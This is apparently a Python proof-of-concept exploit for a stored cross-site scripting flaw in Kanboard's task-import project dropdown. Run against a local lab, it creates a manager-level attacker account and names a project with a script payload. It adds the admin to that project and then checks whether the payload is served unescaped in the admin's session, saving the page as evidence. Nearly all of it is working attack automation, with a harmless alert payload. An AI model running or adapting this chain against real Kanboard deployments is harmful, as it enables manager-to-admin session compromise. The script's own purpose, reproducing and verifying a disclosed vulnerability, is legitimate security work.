#!/usr/bin/env python3
"""PoC for CVE-2025-46825 / GHSA-5wj3-c9v4-pj9v — stored XSS in project name.

Kanboard <= 1.2.44 renders project names unescaped in the task-import project
picker (app/Template/project_view/importTasks.php):

    <option value="<?= $projectId?>"><?= $projectName ?></option>

Attack chain demonstrated here:
  1. A manager (xsattacker) creates a project whose name is a <script> payload.
     Kanboard stores the name raw (verified in the database).
  2. The attacker adds the victim (the app-admin) as a member of the poisoned
     project — a routine, plausible action ("you've been added to my board").
  3. The victim opens the "Import Tasks" dialog on any other project they
     belong to. The dropdown lists every project the user is a member of,
     including the poisoned one, and the payload executes in the victim's
     session: a manager-to-admin stored XSS.

Exit codes: 0 = vulnerability reproduced (raw payload in the HTML served to
            the victim); 2 = payload found HTML-escaped (already fixed);
            1 = setup error.
"""
import os
import pathlib
import re
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from kb import KB

BASE = "http://localhost:8080"
PAYLOAD = "<script>alert(document.domain)</script>"
ATTACK_USER = "xsattacker"
ATTACK_PASS = "xs-attacker-P1"
CTX_PROJECT = "Ops Workstream"
TAG = os.environ.get("POC_TAG", "vulnerable")
EVID = pathlib.Path(__file__).resolve().parent.parent / "evidence" / "01-xss" / TAG

USER_CREATE = "/?controller=UserCreationController&action=show"
PROJ_CREATE = "/?controller=ProjectCreationController&action=create"


def die(msg):
    print("[setup-fail] " + msg)
    sys.exit(1)


def form(html):
    """(action, field names, csrf_token) of the main POST form on the page."""
    m = re.search(r'<form[^>]*method="post"[^>]*action="([^"]+)"', html)
    action = m.group(1).replace("&amp;", "&") if m else None
    fields = set(re.findall(r'<(?:input|select|textarea)[^>]*name="([^"]+)"', html))
    return action, fields, KB.csrf_token(html)


def extract_project_id(html):
    m = re.search(r'project_id=(\d+)', html)
    return m.group(1) if m else None


def user_id_of(page, username):
    i = page.find(">" + username + "<")
    if i < 0:
        return None
    last = None
    for m in re.finditer(r'user_id=(\d+)', page[:i]):
        last = m
    return last.group(1) if last else None


def add_member(session, project_pid, member_username, member_uid, role_needle):
    """Add a user to a project via the project permissions page (action=index,
    addUser form). The form's hidden user_id is populated by JavaScript
    autocomplete in a real browser; we fill it explicitly."""
    url = "/?controller=ProjectPermissionController&action=index&project_id=" + project_pid
    page = session.get(url)
    forms = re.findall(r'<form[^>]*action="([^"]+)"[^>]*>(.*?)</form>', page, re.S)
    target = None
    for action, body in forms:
        fields = set(re.findall(r'name="([^"]+)"', body))
        if "role" in fields and ("user_id" in fields or "username" in fields):
            target = (action.replace("&amp;", "&"), body, fields)
            break
    if target is None:
        for action, body in forms:
            print("    form:", action.replace("&amp;", "&"),
                  "fields:", sorted(set(re.findall(r'name="([^"]+)"', body))))
        die("no add-user form on the permissions page: " + url)
    action, body, fields = target
    tok = KB.csrf_token(page)
    data = {"csrf_token": tok}
    if "username" in fields:
        data["username"] = member_username
        if "name" in fields:
            data["name"] = member_username
    if "user_id" in fields:
        if not member_uid:
            die("no user id known for " + member_username + " — resolve it first")
        data["user_id"] = member_uid
    for extra in ("external_id", "external_id_column"):
        if extra in fields:
            data[extra] = ""
    role_val = None
    for om in re.finditer(r'<option value="([^"]+)"[^>]*>(.*?)</option>', body, re.S):
        if role_needle.lower() in re.sub(r"<[^>]+>", "", om.group(2)).lower():
            role_val = om.group(1)
            break
    if role_val is None:
        die("role option not found for " + role_needle)
    data["role"] = role_val
    session.post(action, data)
    print("[8] victim added to the poisoned project (role:", role_val + ")")


def main():
    EVID.mkdir(parents=True, exist_ok=True)
    print("== CVE-2025-46825 stored-XSS PoC against", BASE, "==")
    print("[1] payload project name:", PAYLOAD)

    admin = KB(BASE)
    if not admin.login("admin", "admin"):
        die("admin/admin login failed — is the vulnerable lab running and fresh?")
    print("[2] victim session: logged in as admin")

    create_form = admin.get(USER_CREATE)
    action, fields, tok = form(create_form)
    if tok is None or "username" not in fields:
        die("user-create form not found at " + USER_CREATE)
    print("[3] user-create form action:", action, "| fields:", sorted(fields))
    data = {
        "username": ATTACK_USER,
        "name": "XSS Attacker",
        "email": "xsattacker@lab.invalid",
        "role": "app-manager",
        "csrf_token": tok,
    }
    if "password" in fields:
        data["password"] = ATTACK_PASS
        if "confirmation" in fields:
            data["confirmation"] = ATTACK_PASS
    admin.post(action, data)
    print("[4] attacker account created (role: app-manager)")

    if "password" not in fields:
        users_page = admin.get("/?controller=UserListController&action=show")
        uid = user_id_of(users_page, ATTACK_USER)
        if uid is None:
            die("attacker user not found in the users list")
        pw_url = "/?controller=UserCredentialController&action=changePassword&user_id=" + uid
        pw_form = admin.get(pw_url)
        pa, pflds, ptok = form(pw_form)
        if ptok is None or "password" not in pflds:
            die("change-password form not found at " + pw_url + " | fields: " + str(sorted(pflds)))
        admin.post(pa, {"password": ATTACK_PASS, "confirmation": ATTACK_PASS, "csrf_token": ptok})
        print("[4b] password set via the admin change-password form (user id", uid + ")")

    attacker = KB(BASE)
    if not attacker.login(ATTACK_USER, ATTACK_PASS):
        die("attacker login failed")
    print("[5] attacker session: logged in as", ATTACK_USER)

    a1, f1, tok = form(admin.get(PROJ_CREATE))
    if tok is None or "name" not in f1:
        die("project-create form not found at " + PROJ_CREATE)
    resp = admin.post(a1, {"name": CTX_PROJECT, "csrf_token": tok})
    ctx_pid = extract_project_id(resp)
    if ctx_pid is None:
        die("admin could not create the victim-context project")
    print("[6] victim-context project created: id", ctx_pid, "(", CTX_PROJECT, ")")

    a2, f2, tok = form(attacker.get(PROJ_CREATE))
    if tok is None or "name" not in f2:
        die("project-create form not found for the attacker (app-manager)")
    resp = attacker.post(a2, {"name": PAYLOAD, "csrf_token": tok})
    poisoned_pid = extract_project_id(resp)
    if poisoned_pid is None:
        die("attacker (app-manager) could not create a project — check role permissions")
    print("[7] poisoned project created: id", poisoned_pid, "(project name is the payload)")

    users_page = admin.get("/?controller=UserListController&action=show")
    admin_uid = user_id_of(users_page, "admin")
    if admin_uid is None:
        die("could not resolve the admin user id from the users page")
    add_member(attacker, poisoned_pid, "admin", admin_uid, "Member")

    imp_url = "/?controller=ProjectViewController&action=importTasks&project_id=" + ctx_pid
    imp = admin.get(imp_url)
    (EVID / "import-page.html").write_text(imp)
    print("[9] admin opened", imp_url)
    print("    HTML saved to evidence/01-xss/" + TAG + "/import-page.html")

    for line in imp.splitlines():
        if "alert(document.domain)" in line:
            print("    served line:", line.strip())

    # Verdict on the exact <option> line: the project-switcher widget embeds
    # the raw name inside a JSON data-params attribute on both builds (that is
    # attribute context, not an executed node), so a whole-page substring test
    # would misjudge the fixed build.
    escaped = (PAYLOAD.replace("&", "&amp;")
                      .replace("<", "&lt;")
                      .replace(">", "&gt;"))
    opt_raw = re.search(r'<option value="\d+">' + re.escape(PAYLOAD) + r'</option>', imp)
    opt_esc = re.search(r'<option value="\d+">' + re.escape(escaped) + r'</option>', imp)
    if opt_raw:
        print("[VERDICT] VULNERABLE — raw <script> payload served unescaped in an <option> node")
        sys.exit(0)
    if opt_esc:
        print("[VERDICT] FIXED — payload present but HTML-escaped in the <option> node")
        sys.exit(2)
    print("[VERDICT] payload not found on the page — setup problem")
    sys.exit(1)


if __name__ == "__main__":
    main()
